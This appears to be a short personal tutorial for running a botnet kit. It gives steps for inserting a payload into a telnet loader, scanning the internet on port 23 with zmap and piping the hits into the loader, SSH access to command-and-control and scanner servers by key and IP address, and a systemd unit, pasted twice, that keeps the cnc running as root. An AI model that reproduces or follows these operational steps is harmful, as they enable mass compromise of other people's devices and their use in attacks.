1. Replace the payload in telnet.go with your payload
2. Run "go build telnet.go"
3. Start scanning with "ulimit -u999999; ulimit -n999999; zmap -p23 | ./telnet"


my tutorial:
1. start cnc:
ssh -i averykey root@164.90.171.162
on the vps:
./cnc

(or add to systemd
"
[Unit]
Description=alwaysruncnc
After=network.target

[Service]
ExecStart=/root/cnc
Restart=always
User=root
WorkingDirectory=/root
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
"
if u wanna stop that do sudo systemctl stop myjob.service)


2. run scanner:
connect to ubuntu vps to start the scanner:
ssh -i averykey root@164.92.131.53

on the vps:
ulimit -u999999; ulimit -n999999; zmap -p23 | ./telnet

[Unit]
Description=alwaysruncnc
After=network.target

[Service]
ExecStart=/root/cnc
Restart=always
User=root
WorkingDirectory=/root
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target

sudo systemctl daemon-reload
sudo systemctl enable myjob.service
sudo systemctl start myjob.service

